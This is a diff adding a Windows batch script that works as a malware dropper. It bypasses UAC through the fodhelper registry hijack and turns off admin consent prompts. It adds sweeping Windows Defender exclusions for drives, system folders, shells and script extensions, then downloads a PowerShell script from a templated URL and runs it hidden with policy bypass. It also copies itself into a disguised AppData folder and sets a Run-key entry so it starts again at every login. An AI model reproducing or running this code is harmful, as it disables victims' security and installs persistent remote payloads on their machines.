@@ -1,0 +1,49 @@
+﻿if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
+@echo off
+
+REG ADD "HKCU\SOFTWARE\Classes\ms-settings\shell\open\command" /t REG_SZ /d "C:\windows\system32\cmd.exe /c REG ADD HKLM\software\microsoft\windows\currentversion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f" /f
+REG ADD "hkcu\software\classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d " " /f
+fodhelper.exe
+
+@Echo Off
+Cd %systemroot%\system32
+net sess>nul 2>&1||(start mshta vbscript:code(close(Execute("CreateObject(""Shell.Application"").ShellExecute""%~0"",,,""RunAs"",1"^)^)^)&exit)
+
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'C:\'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess 'cmd'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess 'cmd.exe'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess 'conhost'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess 'powershell'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess 'powershell.exe'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '.bat'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess 'conhost.exe'"
+Powershell -Command Add-MpPreference -ExclusionExtension "bat"
+powershell -Command Add-MpPreference -ExclusionExtension "exe"
+powershell -Command Add-MpPreference -ExclusionExtension "ps1"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%TEMP%'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'TEMP'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\sysconfig'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'D:\'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'E:\'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'F:\'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'J:\'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'G:\'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'I:\'"
+powershell -inputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"
+Delete-Show-Error "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
+
+setlocal enabledelayedexpansion
+start /B PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('%%%Last URL%%%','%APPDATA%\Scan.ps1') 
+@echo off
+ set "appDataPath=%APPDATA%"
+echo AppData path: !appDataPath!
+start /B powershell.exe -ExecutionPolicy Bypass -File "!appDataPath!\Scan.ps1" -noprofile -windowstyle hidden
+set "currentFileName=%~nx0"
+set "appDataFolder=%APPDATA%\Win32SecTool"
+set "destinationPath=!appDataFolder!"
+mkdir "!destinationPath!"
+copy "%~f0" "!destinationPath!" /Y
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Sys64" /t REG_SZ /d "\"!destinationPath!\!currentFileName!\"" /f
+endlocal
+exit
